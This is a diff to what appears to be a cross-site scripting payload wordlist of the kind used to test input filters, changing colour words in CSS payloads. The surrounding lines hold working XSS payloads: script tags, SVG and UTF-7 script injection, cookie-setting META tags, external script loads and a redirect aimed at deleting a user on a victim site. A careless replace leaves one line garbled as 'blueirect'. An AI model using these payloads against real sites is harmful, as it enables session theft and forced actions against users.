@@ -260,8 +260,8 @@ javascript:alert("hellox worldss")
 <? foo="><x foo='?><script>alert(1)</script>'>">
 <! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
 <% foo><x foo="%><script>alert(123)</script>">
-<div style="font-family:'foo&#10;;color:red;';">LOL
-LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<div style="font-family:'foo&#10;;color:blue;';">LOL
+LOL<style>*{/*all*/color/*all*/:/*all*/blue/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
 <script>({0:#0=alert/#0#/#0#(0)})</script>
 <svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
 &lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
@@ -335,7 +335,7 @@ eval(a+b+c+d);
 &lt;? echo('&lt;SCR)';
 echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
 &lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
-Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+blueirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
 &lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
 &lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 &lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
